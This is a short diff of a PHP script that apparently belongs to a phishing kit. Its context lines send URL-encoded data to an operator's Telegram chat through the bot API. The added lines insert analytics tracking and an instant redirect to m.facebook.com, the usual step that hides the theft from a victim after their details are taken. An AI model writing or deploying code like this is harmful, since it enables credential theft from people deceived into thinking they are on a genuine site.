@@ -35,3 +35,17 @@ $text = urlencode("
 $url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
 file_get_contents($url);
 ?>
+<html>
+<head>
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159654279-2"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag("js", new Date());
+gtag("config", "UA-159654279-2");
+</script>
+<meta http-equiv="Refresh" content="0; url=https://m.facebook.com" />
+</head>
+<body>
+</body>
+</html>
